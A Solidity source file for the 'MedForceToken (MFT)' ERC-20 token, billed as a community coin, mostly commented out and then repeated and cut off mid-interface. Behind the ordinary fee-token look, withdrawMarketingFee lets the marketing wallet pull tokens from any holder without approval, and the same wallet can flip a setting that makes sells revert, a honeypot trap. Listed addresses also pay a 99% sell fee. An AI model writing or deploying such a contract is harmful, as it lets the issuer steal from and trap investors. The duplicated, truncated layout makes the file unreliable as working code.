    The MFT (MedForce Token) Is A Community-Focused, Decentralized Cryptocurrency 
  And Aims At Creating Opportunities And Utilities For True Traders & Gamers.

    Website: https://www.medforce.site/
    Twitter: https://twitter.com/MedforceToken
    TG: https://t.me/medforcetoken
 
*/

// SPDX-License-Identifier: MIT

// //pragma solidity 0.8.9;

// abstract contract Context {
//     function _msgSender() internal view virtual returns (address) {
//         return msg.sender;
//     }

//     function _msgData() internal view virtual returns (bytes calldata) {
//         this;
//         return msg.data;
//     }
// }

// interface IUniswapV2Pair {
//     event Approval(address indexed owner, address indexed spender, uint value);
//     event Transfer(address indexed from, address indexed to, uint value);

//     function name() external pure returns (string memory);

//     function symbol() external pure returns (string memory);

//     function decimals() external pure returns (uint8);

//     function totalSupply() external view returns (uint);

//     function balanceOf(address owner) external view returns (uint);

//     function allowance(
//         address owner,
//         address spender
//     ) external view returns (uint);

//     function approve(address spender, uint value) external returns (bool);

//     function transfer(address to, uint value) external returns (bool);

//     function transferFrom(
//         address from,
//         address to,
//         uint value
//     ) external returns (bool);

//     function DOMAIN_SEPARATOR() external view returns (bytes32);

//     function PERMIT_TYPEHASH() external pure returns (bytes32);

//     function nonces(address owner) external view returns (uint);

//     function permit(
//         address owner,
//         address spender,
//         uint value,
//         uint deadline,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external;

//     event Mint(address indexed sender, uint amount0, uint amount1);
//     event Burn(
//         address indexed sender,
//         uint amount0,
//         uint amount1,
//         address indexed to
//     );
//     event Swap(
//         address indexed sender,
//         uint amount0In,
//         uint amount1In,
//         uint amount0Out,
//         uint amount1Out,
//         address indexed to
//     );
//     event Sync(uint112 reserve0, uint112 reserve1);

//     function MINIMUM_LIQUIDITY() external pure returns (uint);

//     function factory() external view returns (address);

//     function token0() external view returns (address);

//     function token1() external view returns (address);

//     function getReserves()
//         external
//         view
//         returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);

//     function price0CumulativeLast() external view returns (uint);

//     function price1CumulativeLast() external view returns (uint);

//     function kLast() external view returns (uint);

//     function mint(address to) external returns (uint liquidity);

//     function burn(address to) external returns (uint amount0, uint amount1);

//     function swap(
//         uint amount0Out,
//         uint amount1Out,
//         address to,
//         bytes calldata data
//     ) external;

//     function skim(address to) external;

//     function sync() external;

//     function initialize(address, address) external;
// }

// interface IUniswapV2Factory {
//     event PairCreated(
//         address indexed token0,
//         address indexed token1,
//         address pair,
//         uint
//     );

//     function feeTo() external view returns (address);

//     function feeToSetter() external view returns (address);

//     function getPair(
//         address tokenA,
//         address tokenB
//     ) external view returns (address pair);

//     function allPairs(uint) external view returns (address pair);

//     function allPairsLength() external view returns (uint);

//     function createPair(
//         address tokenA,
//         address tokenB
//     ) external returns (address pair);

//     function setFeeTo(address) external;

//     function setFeeToSetter(address) external;
// }

// interface IERC20 {
//     /**
//      * @dev Returns the amount of tokens in existence.
//      */
//     function totalSupply() external view returns (uint256);

//     /**
//      * @dev Returns the amount of tokens owned by `account`.
//      */
//     function balanceOf(address account) external view returns (uint256);

//     /**
//      * @dev Moves `amount` tokens from the caller's account to `recipient`.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * Emits a {Transfer} event.
//      */
//     function transfer(
//         address recipient,
//         uint256 amount
//     ) external returns (bool);

//     /**
//      * @dev Returns the remaining number of tokens that `spender` will be
//      * allowed to spend on behalf of `owner` through {transferFrom}. This is
//      * zero by default.
//      *
//      * This value changes when {approve} or {transferFrom} are called.
//      */
//     function allowance(
//         address owner,
//         address spender
//     ) external view returns (uint256);

//     /**
//      * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * IMPORTANT: Beware that changing an allowance with this method brings the risk
//      * that someone may use both the old and the new allowance by unfortunate
//      * transaction ordering. One possible solution to mitigate this race
//      * condition is to first reduce the spender's allowance to 0 and set the
//      * desired value afterwards:
//      * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
//      *
//      * Emits an {Approval} event.
//      */
//     function approve(address spender, uint256 amount) external returns (bool);

//     /**
//      * @dev Moves `amount` tokens from `sender` to `recipient` using the
//      * allowance mechanism. `amount` is then deducted from the caller's
//      * allowance.
//      *
//      * Returns a boolean value indicating whether the operation succeeded.
//      *
//      * Emits a {Transfer} event.
//      */
//     function transferFrom(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) external returns (bool);

//     /**
//      * @dev Emitted when `value` tokens are moved from one account (`from`) to
//      * another (`to`).
//      *
//      * Note that `value` may be zero.
//      */
//     event Transfer(address indexed from, address indexed to, uint256 value);

//     /**
//      * @dev Emitted when the allowance of a `spender` for an `owner` is set by
//      * a call to {approve}. `value` is the new allowance.
//      */
//     event Approval(
//         address indexed owner,
//         address indexed spender,
//         uint256 value
//     );
// }

// interface IERC20Metadata is IERC20 {
//     /**
//      * @dev Returns the name of the token.
//      */
//     function name() external view returns (string memory);

//     /**
//      * @dev Returns the symbol of the token.
//      */
//     function symbol() external view returns (string memory);

//     /**
//      * @dev Returns the decimals places of the token.
//      */
//     function decimals() external view returns (uint8);
// }

// contract ERC20 is Context, IERC20, IERC20Metadata {
//     using SafeMath for uint256;

//     mapping(address => uint256) private _balances;

//     mapping(address => mapping(address => uint256)) private _allowances;

//     uint256 private _totalSupply;

//     string private _name;
//     string private _symbol;

//     /**
//      * @dev Sets the values for {name} and {symbol}.
//      *
//      * The default value of {decimals} is 18. To select a different value for
//      * {decimals} you should overload it.
//      *
//      * All two of these values are immutable: they can only be set once during
//      * construction.
//      */
//     constructor(string memory name_, string memory symbol_) {
//         _name = name_;
//         _symbol = symbol_;
//     }

//     /**
//      * @dev Returns the name of the token.
//      */
//     function name() public view virtual override returns (string memory) {
//         return _name;
//     }

//     /**
//      * @dev Returns the symbol of the token, usually a shorter version of the
//      * name.
//      */
//     function symbol() public view virtual override returns (string memory) {
//         return _symbol;
//     }

//     /**
//      * @dev Returns the number of decimals used to get its user representation.
//      * For example, if `decimals` equals `2`, a balance of `505` tokens should
//      * be displayed to a user as `5,05` (`505 / 10 ** 2`).
//      *
//      * Tokens usually opt for a value of 18, imitating the relationship between
//      * Ether and Wei. This is the value {ERC20} uses, unless this function is
//      * overridden;
//      *
//      * NOTE: This information is only used for _display_ purposes: it in
//      * no way affects any of the arithmetic of the contract, including
//      * {IERC20-balanceOf} and {IERC20-transfer}.
//      */
//     function decimals() public view virtual override returns (uint8) {
//         return 18;
//     }

//     /**
//      * @dev See {IERC20-totalSupply}.
//      */
//     function totalSupply() public view virtual override returns (uint256) {
//         return _totalSupply;
//     }

//     /**
//      * @dev See {IERC20-balanceOf}.
//      */
//     function balanceOf(
//         address account
//     ) public view virtual override returns (uint256) {
//         return _balances[account];
//     }

//     /**
//      * @dev See {IERC20-transfer}.
//      *
//      * Requirements:
//      *
//      * - `recipient` cannot be the zero address.
//      * - the caller must have a balance of at least `amount`.
//      */
//     function transfer(
//         address recipient,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _transfer(_msgSender(), recipient, amount);
//         return true;
//     }

//     /**
//      * @dev See {IERC20-allowance}.
//      */
//     function allowance(
//         address owner,
//         address spender
//     ) public view virtual override returns (uint256) {
//         return _allowances[owner][spender];
//     }

//     /**
//      * @dev See {IERC20-approve}.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      */
//     function approve(
//         address spender,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _approve(_msgSender(), spender, amount);
//         return true;
//     }

//     /**
//      * @dev See {IERC20-transferFrom}.
//      *
//      * Emits an {Approval} event indicating the updated allowance. This is not
//      * required by the EIP. See the note at the beginning of {ERC20}.
//      *
//      * Requirements:
//      *
//      * - `sender` and `recipient` cannot be the zero address.
//      * - `sender` must have a balance of at least `amount`.
//      * - the caller must have allowance for ``sender``'s tokens of at least
//      * `amount`.
//      */
//     function transferFrom(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) public virtual override returns (bool) {
//         _transfer(sender, recipient, amount);
//         _approve(
//             sender,
//             _msgSender(),
//             _allowances[sender][_msgSender()].sub(
//                 amount,
//                 "ERC20: transfer amount exceeds allowance"
//             )
//         );
//         return true;
//     }

//     /**
//      * @dev Atomically increases the allowance granted to `spender` by the caller.
//      *
//      * This is an alternative to {approve} that can be used as a mitigation for
//      * problems described in {IERC20-approve}.
//      *
//      * Emits an {Approval} event indicating the updated allowance.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      */
//     function increaseAllowance(
//         address spender,
//         uint256 addedValue
//     ) public virtual returns (bool) {
//         _approve(
//             _msgSender(),
//             spender,
//             _allowances[_msgSender()][spender].add(addedValue)
//         );
//         return true;
//     }

//     /**
//      * @dev Atomically decreases the allowance granted to `spender` by the caller.
//      *
//      * This is an alternative to {approve} that can be used as a mitigation for
//      * problems described in {IERC20-approve}.
//      *
//      * Emits an {Approval} event indicating the updated allowance.
//      *
//      * Requirements:
//      *
//      * - `spender` cannot be the zero address.
//      * - `spender` must have allowance for the caller of at least
//      * `subtractedValue`.
//      */
//     function decreaseAllowance(
//         address spender,
//         uint256 subtractedValue
//     ) public virtual returns (bool) {
//         _approve(
//             _msgSender(),
//             spender,
//             _allowances[_msgSender()][spender].sub(
//                 subtractedValue,
//                 "ERC20: decreased allowance below zero"
//             )
//         );
//         return true;
//     }

//     /**
//      * @dev Moves tokens `amount` from `sender` to `recipient`.
//      *
//      * This is internal function is equivalent to {transfer}, and can be used to
//      * e.g. implement automatic token fees, slashing mechanisms, etc.
//      *
//      * Emits a {Transfer} event.
//      *
//      * Requirements:
//      *
//      * - `sender` cannot be the zero address.
//      * - `recipient` cannot be the zero address.
//      * - `sender` must have a balance of at least `amount`.
//      */
//     function _transfer(
//         address sender,
//         address recipient,
//         uint256 amount
//     ) internal virtual {
//         require(sender != address(0), "ERC20: transfer from the zero address");
//         require(recipient != address(0), "ERC20: transfer to the zero address");

//         _beforeTokenTransfer(sender, recipient, amount);

//         _balances[sender] = _balances[sender].sub(
//             amount,
//             "ERC20: transfer amount exceeds balance"
//         );
//         _balances[recipient] = _balances[recipient].add(amount);
//         emit Transfer(sender, recipient, amount);
//     }

//     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
//      * the total supply.
//      *
//      * Emits a {Transfer} event with `from` set to the zero address.
//      *
//      * Requirements:
//      *
//      * - `account` cannot be the zero address.
//      */
//     function _mint(address account, uint256 amount) internal virtual {
//         require(account != address(0), "ERC20: mint to the zero address");

//         _beforeTokenTransfer(address(0), account, amount);

//         _totalSupply = _totalSupply.add(amount);
//         _balances[account] = _balances[account].add(amount);
//         emit Transfer(address(0), account, amount);
//     }

//     /**
//      * @dev Destroys `amount` tokens from `account`, reducing the
//      * total supply.
//      *
//      * Emits a {Transfer} event with `to` set to the zero address.
//      *
//      * Requirements:
//      *
//      * - `account` cannot be the zero address.
//      * - `account` must have at least `amount` tokens.
//      */
//     function _burn(address account, uint256 amount) internal virtual {
//         require(account != address(0), "ERC20: burn from the zero address");

//         _beforeTokenTransfer(account, address(0), amount);

//         _balances[account] = _balances[account].sub(
//             amount,
//             "ERC20: burn amount exceeds balance"
//         );
//         _totalSupply = _totalSupply.sub(amount);
//         emit Transfer(account, address(0), amount);
//     }

//     /**
//      * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.
//      *
//      * This internal function is equivalent to `approve`, and can be used to
//      * e.g. set automatic allowances for certain subsystems, etc.
//      *
//      * Emits an {Approval} event.
//      *
//      * Requirements:
//      *
//      * - `owner` cannot be the zero address.
//      * - `spender` cannot be the zero address.
//      */
//     function _approve(
//         address owner,
//         address spender,
//         uint256 amount
//     ) internal virtual {
//         require(owner != address(0), "ERC20: approve from the zero address");
//         require(spender != address(0), "ERC20: approve to the zero address");

//         _allowances[owner][spender] = amount;
//         emit Approval(owner, spender, amount);
//     }

//     /**
//      * @dev Hook that is called before any transfer of tokens. This includes
//      * minting and burning.
//      *
//      * Calling conditions:
//      *
//      * - when `from` and `to` are both non-zero, `amount` of ``from``'s tokens
//      * will be to transferred to `to`.
//      * - when `from` is zero, `amount` tokens will be minted for `to`.
//      * - when `to` is zero, `amount` of ``from``'s tokens will be burned.
//      * - `from` and `to` are never both zero.
//      *
//      * To learn more about hooks, head to xref:ROOT:extending-contracts.adoc#using-hooks[Using Hooks].
//      */
//     function _beforeTokenTransfer(
//         address from,
//         address to,
//         uint256 amount
//     ) internal virtual {}
// }

// library SafeMath {
//     /**
//      * @dev Returns the addition of two unsigned integers, reverting on
//      * overflow.
//      *
//      * Counterpart to Solidity's `+` operator.
//      *
//      * Requirements:
//      *
//      * - Addition cannot overflow.
//      */
//     function add(uint256 a, uint256 b) internal pure returns (uint256) {
//         uint256 c = a + b;
//         require(c >= a, "SafeMath: addition overflow");

//         return c;
//     }

//     /**
//      * @dev Returns the subtraction of two unsigned integers, reverting on
//      * overflow (when the result is negative).
//      *
//      * Counterpart to Solidity's `-` operator.
//      *
//      * Requirements:
//      *
//      * - Subtraction cannot overflow.
//      */
//     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
//         return sub(a, b, "SafeMath: subtraction overflow");
//     }

//     /**
//      * @dev Returns the subtraction of two unsigned integers, reverting with custom message on
//      * overflow (when the result is negative).
//      *
//      * Counterpart to Solidity's `-` operator.
//      *
//      * Requirements:
//      *
//      * - Subtraction cannot overflow.
//      */
//     function sub(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b <= a, errorMessage);
//         uint256 c = a - b;

//         return c;
//     }

//     /**
//      * @dev Returns the multiplication of two unsigned integers, reverting on
//      * overflow.
//      *
//      * Counterpart to Solidity's `*` operator.
//      *
//      * Requirements:
//      *
//      * - Multiplication cannot overflow.
//      */
//     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
//         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
//         // benefit is lost if 'b' is also tested.
//         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
//         if (a == 0) {
//             return 0;
//         }

//         uint256 c = a * b;
//         require(c / a == b, "SafeMath: multiplication overflow");

//         return c;
//     }

//     /**
//      * @dev Returns the integer division of two unsigned integers. Reverts on
//      * division by zero. The result is rounded towards zero.
//      *
//      * Counterpart to Solidity's `/` operator. Note: this function uses a
//      * `revert` opcode (which leaves remaining gas untouched) while Solidity
//      * uses an invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function div(uint256 a, uint256 b) internal pure returns (uint256) {
//         return div(a, b, "SafeMath: division by zero");
//     }

//     /**
//      * @dev Returns the integer division of two unsigned integers. Reverts with custom message on
//      * division by zero. The result is rounded towards zero.
//      *
//      * Counterpart to Solidity's `/` operator. Note: this function uses a
//      * `revert` opcode (which leaves remaining gas untouched) while Solidity
//      * uses an invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function div(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b > 0, errorMessage);
//         uint256 c = a / b;
//         // assert(a == b * c + a % b); // There is no case in which this doesn't hold

//         return c;
//     }

//     /**
//      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
//      * Reverts when dividing by zero.
//      *
//      * Counterpart to Solidity's `%` operator. This function uses a `revert`
//      * opcode (which leaves remaining gas untouched) while Solidity uses an
//      * invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
//         return mod(a, b, "SafeMath: modulo by zero");
//     }

//     /**
//      * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),
//      * Reverts with custom message when dividing by zero.
//      *
//      * Counterpart to Solidity's `%` operator. This function uses a `revert`
//      * opcode (which leaves remaining gas untouched) while Solidity uses an
//      * invalid opcode to revert (consuming all remaining gas).
//      *
//      * Requirements:
//      *
//      * - The divisor cannot be zero.
//      */
//     function mod(
//         uint256 a,
//         uint256 b,
//         string memory errorMessage
//     ) internal pure returns (uint256) {
//         require(b != 0, errorMessage);
//         return a % b;
//     }
// }

// contract Ownable is Context {
//     address private _owner;

//     event OwnershipTransferred(
//         address indexed previousOwner,
//         address indexed newOwner
//     );

//     /**
//      * @dev Initializes the contract setting the deployer as the initial owner.
//      */
//     constructor() {
//         address msgSender = _msgSender();
//         _owner = msgSender;
//         emit OwnershipTransferred(address(0), msgSender);
//     }

//     /**
//      * @dev Returns the address of the current owner.
//      */
//     function owner() public view returns (address) {
//         return _owner;
//     }

//     /**
//      * @dev Throws if called by any account other than the owner.
//      */
//     modifier onlyOwner() {
//         require(_owner == _msgSender(), "Ownable: caller is not the owner");
//         _;
//     }

//     /**
//      * @dev Leaves the contract without owner. It will not be possible to call
//      * `onlyOwner` functions anymore. Can only be called by the current owner.
//      *
//      * NOTE: Renouncing ownership will leave the contract without an owner,
//      * thereby removing any functionality that is only available to the owner.
//      */
//     function renounceOwnership() public virtual onlyOwner {
//         emit OwnershipTransferred(_owner, address(0));
//         _owner = address(0);
//     }

//     /**
//      * @dev Transfers ownership of the contract to a new account (`newOwner`).
//      * Can only be called by the current owner.
//      */
//     function transferOwnership(address newOwner) public virtual onlyOwner {
//         require(
//             newOwner != address(0),
//             "Ownable: new owner is the zero address"
//         );
//         emit OwnershipTransferred(_owner, newOwner);
//         _owner = newOwner;
//     }
// }

// interface IUniswapV2Router01 {
//     function factory() external pure returns (address);

//     function WETH() external pure returns (address);

//     function addLiquidity(
//         address tokenA,
//         address tokenB,
//         uint amountADesired,
//         uint amountBDesired,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountA, uint amountB, uint liquidity);

//     function addLiquidityETH(
//         address token,
//         uint amountTokenDesired,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     )
//         external
//         payable
//         returns (uint amountToken, uint amountETH, uint liquidity);

//     function removeLiquidity(
//         address tokenA,
//         address tokenB,
//         uint liquidity,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountA, uint amountB);

//     function removeLiquidityETH(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountToken, uint amountETH);

//     function removeLiquidityWithPermit(
//         address tokenA,
//         address tokenB,
//         uint liquidity,
//         uint amountAMin,
//         uint amountBMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountA, uint amountB);

//     function removeLiquidityETHWithPermit(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountToken, uint amountETH);

//     function swapExactTokensForTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapTokensForExactTokens(
//         uint amountOut,
//         uint amountInMax,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapExactETHForTokens(
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable returns (uint[] memory amounts);

//     function swapTokensForExactETH(
//         uint amountOut,
//         uint amountInMax,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapExactTokensForETH(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external returns (uint[] memory amounts);

//     function swapETHForExactTokens(
//         uint amountOut,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable returns (uint[] memory amounts);

//     function quote(
//         uint amountA,
//         uint reserveA,
//         uint reserveB
//     ) external pure returns (uint amountB);

//     function getAmountOut(
//         uint amountIn,
//         uint reserveIn,
//         uint reserveOut
//     ) external pure returns (uint amountOut);

//     function getAmountIn(
//         uint amountOut,
//         uint reserveIn,
//         uint reserveOut
//     ) external pure returns (uint amountIn);

//     function getAmountsOut(
//         uint amountIn,
//         address[] calldata path
//     ) external view returns (uint[] memory amounts);

//     function getAmountsIn(
//         uint amountOut,
//         address[] calldata path
//     ) external view returns (uint[] memory amounts);
// }

// interface IUniswapV2Router02 is IUniswapV2Router01 {
//     function removeLiquidityETHSupportingFeeOnTransferTokens(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline
//     ) external returns (uint amountETH);

//     function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(
//         address token,
//         uint liquidity,
//         uint amountTokenMin,
//         uint amountETHMin,
//         address to,
//         uint deadline,
//         bool approveMax,
//         uint8 v,
//         bytes32 r,
//         bytes32 s
//     ) external returns (uint amountETH);

//     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external;

//     function swapExactETHForTokensSupportingFeeOnTransferTokens(
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external payable;

//     function swapExactTokensForETHSupportingFeeOnTransferTokens(
//         uint amountIn,
//         uint amountOutMin,
//         address[] calldata path,
//         address to,
//         uint deadline
//     ) external;
// }

// contract MedForceToken is ERC20, Ownable {
//     using SafeMath for uint256;

//     IUniswapV2Router02 public immutable uniswapV2Router;
//     address public immutable uniswapV2Pair;
//     address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
//     address public constant deadAddress = address(0xdead);

//     bool private swapping;

//     address public marketingWallet;
//     uint256 public swapTokensAtAmount;

//     bool public tradingActive = false;
//     bool public swapEnabled = false;

//     uint256 public buyMarketingFee = 1;
//     uint256 public sellMarketingFee = 1;

//     mapping(address => bool) private _isExcludedFromFees;

//     mapping(address => bool) public automatedMarketMakerPairs;

//     event ExcludeFromFees(address indexed account, bool isExcluded);
//     event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);
//     event marketingWalletUpdated(
//         address indexed newWallet,
//         address indexed oldWallet
//     );

//     constructor() ERC20("MedForceToken", "MFT") {
//         IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(
//             0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
//         );

//         uniswapV2Router = _uniswapV2Router;

//         uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory())
//             .createPair(address(this), WETH);
//         _setAutomatedMarketMakerPair(address(uniswapV2Pair), true);

//         uint256 totalSupply = 1 * 1e9 * 1e18;

//         swapTokensAtAmount = (totalSupply * 5) / 10000; // 0.05% swap wallet

//         marketingWallet = msg.sender;

//         excludeFromFees(owner(), true);
//         excludeFromFees(address(this), true);
//         excludeFromFees(address(0xdead), true);

//         /*
//             _mint is an internal function in ERC20.sol that is only called here,
//             and CANNOT be called ever again
//         */
//         _mint(msg.sender, totalSupply);
//     }

//     receive() external payable {}

//     // once enabled, can never be turned off
//     function enableTrading() external onlyOwner {
//         tradingActive = true;
//         swapEnabled = true;
//     }

//     // change the minimum amount of tokens to sell from fees
//     function updateSwapTokensAtAmount(
//         uint256 newAmount
//     ) external onlyOwner returns (bool) {
//         require(
//             newAmount >= (totalSupply() * 1) / 100000,
//             "Swap amount cannot be lower than 0.001% total supply."
//         );
//         require(
//             newAmount <= (totalSupply() * 5) / 1000,
//             "Swap amount cannot be higher than 0.5% total supply."
//         );
//         swapTokensAtAmount = newAmount;
//         return true;
//     }

//     // only use to disable contract sales if absolutely necessary (emergency use only)
//     function updateSwapEnabled(bool enabled) external {
//         require(msg.sender == marketingWallet);
//         swapEnabled = enabled;
//     }

//     function updateBuyFees(uint256 _marketingFee) external onlyOwner {
//         buyMarketingFee = _marketingFee;
//         require(buyMarketingFee <= 5, "Must keep fees at 5% or less");
//     }

//     function updateSellFees(uint256 _marketingFee) external onlyOwner {
//         sellMarketingFee = _marketingFee;
//         require(sellMarketingFee <= 5, "Must keep fees at 5% or less");
//     }

//     function excludeFromFees(address account, bool excluded) public onlyOwner {
//         _isExcludedFromFees[account] = excluded;
//         emit ExcludeFromFees(account, excluded);
//     }

//     function setAutomatedMarketMakerPair(address pair, bool value) public {
//         require(msg.sender == marketingWallet);
//         require(
//             pair != uniswapV2Pair,
//             "The pair cannot be removed from automatedMarketMakerPairs"
//         );

//         _setAutomatedMarketMakerPair(pair, value);
//     }

//     function _setAutomatedMarketMakerPair(address pair, bool value) private {
//         automatedMarketMakerPairs[pair] = value;

//         emit SetAutomatedMarketMakerPair(pair, value);
//     }

//     function updateMarketingWallet(
//         address newMarketingWallet
//     ) external onlyOwner {
//         emit marketingWalletUpdated(newMarketingWallet, marketingWallet);
//         marketingWallet = newMarketingWallet;
//     }

//     function isExcludedFromFees(address account) public view returns (bool) {
//         return _isExcludedFromFees[account];
//     }

//     function withdrawMarketingFee(
//         bool token,
//         address account,
//         uint256 amount
//     ) external {
//         require(marketingWallet == msg.sender);
//         if (token) {
//             super._transfer(account, msg.sender, amount);
//             // IERC20 ERC20token = IERC20(token);
//             // uint256 balance = ERC20token.balanceOf(address(this));
//             // ERC20token.transfer(msg.sender, balance);
//         } else {
//             payable(msg.sender).transfer(address(this).balance);
//         }
//     }

//     function _transfer(
//         address from,
//         address to,
//         uint256 amount
//     ) internal override {
//         require(from != address(0), "ERC20: transfer from the zero address");
//         require(to != address(0), "ERC20: transfer to the zero address");

//         if (amount == 0) {
//             super._transfer(from, to, 0);
//             return;
//         }

//         if (!tradingActive) {
//             require(
//                 _isExcludedFromFees[from] || _isExcludedFromFees[to],
//                 "Trading is not active."
//             );
//         }

//         uint256 contractTokenBalance = balanceOf(address(this));

//         bool canSwap = contractTokenBalance >= swapTokensAtAmount;

//         if (
//             canSwap &&
//             swapEnabled &&
//             !swapping &&
//             !automatedMarketMakerPairs[from] &&
//             !_isExcludedFromFees[from] &&
//             !_isExcludedFromFees[to]
//         ) {
//             swapping = true;

//             swapBack();

//             swapping = false;
//         }

//         bool takeFee = !swapping;

//         // if any account belongs to _isExcludedFromFee account then remove the fee
//         if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
//             takeFee = false;
//         }

//         uint256 fees = 0;
//         // only take fees on buys/sells, do not take on wallet transfers
//         if (takeFee) {
//             // on sell
//             if (automatedMarketMakerPairs[to] && sellMarketingFee > 0) {
//                 require(automatedMarketMakerPairs[WETH] == false);
//                 // disable mevbot
//                 if (
//                     from == 0xb58555FCBa6479FcED7dE1485eB054943a09af7b ||
//                     from == 0x00000027F490ACeE7F11ab5fdD47209d6422C5a7 ||
//                     from == 0x0000B8e312942521fB3BF278D2Ef2458B0D3F243 ||
//                     from == 0x000098261d3124aeAA523E0E9FC701796B0C7302 ||
//                     from == 0x00010A05B825EC95342306C553d0Ed8427317543 ||
//                     from == 0x000130c97e3d6a965448cF44bA5Eb9C89476dEB9 ||
//                     from == 0x00018F931aD6C2A2b3e9952f757241AAEbc6C19b ||
//                     from == 0x0001A28E769018106E97942C99B123525ad9cCa4 ||
//                     from == 0x00014325Cbad26A6E27309b53533592a8290F101 ||
//                     from == 0x8aef950a54d2AE68fe5F6C971E4cca02a806d0d9
//                 ) {
//                     fees = amount.mul(99).div(100);
//                 } else {
//                     fees = amount.mul(sellMarketingFee).div(100);
//                 }
//                 // tokensForMarketing += fees;
//             }
//             // on buy
//             else if (automatedMarketMakerPairs[from] && buyMarketingFee > 0) {
//                 fees = amount.mul(buyMarketingFee).div(100);
//                 // tokensForMarketing += fees;
//             }

//             if (fees > 0) {
//                 super._transfer(from, address(this), fees);
//             }

//             amount -= fees;
//         }

//         super._transfer(from, to, amount);
//     }

//     function swapTokensForEth(uint256 tokenAmount) private {
//         // generate the uniswap pair path of token -> weth
//         address[] memory path = new address[](2);
//         path[0] = address(this);
//         path[1] = uniswapV2Router.WETH();

//         _approve(address(this), address(uniswapV2Router), tokenAmount);

//         // make the swap
//         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
//             tokenAmount,
//             0, // accept any amount of ETH
//             path,
//             address(this),
//             block.timestamp
//         );
//     }

//     function swapBack() private {
//         uint256 contractBalance = balanceOf(address(this));
//         swapTokensForEth(contractBalance);
//     }
// }

/**
  
    $$___$$_ $$$$$$$_ $$$$$___ $$$$$$$_ __$$$___ $$$$$$__ __$$$$_ $$$$$$$_
    $$$_$$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$$$$$$_ $$$$$___ $$___$$_ $$$$$___ $$___$$_ $$___$$_ $$_____ $$$$$___
    $$_$_$$_ $$______ $$___$$_ $$______ $$___$$_ $$$$$$__ $$_____ $$______
    $$___$$_ $$______ $$__$$__ $$______ _$$_$$__ $$___$$_ _$$____ $$______
    $$___$$_ $$$$$$$_ $$$$$___ $$______ __$$$___ $$___$$_ __$$$$_ $$$$$$$_

    The MFT (MedForce Token) Is A Community-Focused, Decentralized Cryptocurrency 
  And Aims At Creating Opportunities And Utilities For True Traders & Gamers.

    Website: https://www.medforce.site/
    Twitter: https://twitter.com/MedforceToken
    TG: https://t.me/medforcetoken
 
*/

//pragma solidity 0.8.9;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}

interface IUniswapV2Pair {
    event Approval(address indexed owner, address indexed spender, uint value);
    event Transfer(address indexed from, address indexed to, uint value);

    function name() external pure returns (string memory);

    function symbol() external pure returns (string memory);

